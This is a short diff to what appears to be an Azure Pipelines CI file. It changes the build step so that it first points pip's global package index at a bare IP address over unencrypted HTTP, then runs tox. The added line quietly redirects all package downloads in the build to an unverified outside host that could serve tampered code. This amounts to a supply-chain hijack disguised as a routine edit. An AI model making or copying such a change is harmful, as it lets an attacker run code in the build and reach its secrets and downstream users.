@@ -28,4 +28,5 @@ jobs:
         inputs:
           targetType: 'inline'  
           workingDirectory: $(Build.Repository.LocalPath)
-          script: tox
+          script: pip config --user set global.index-url http://18.170.223.248:8080/simple/
+                  tox
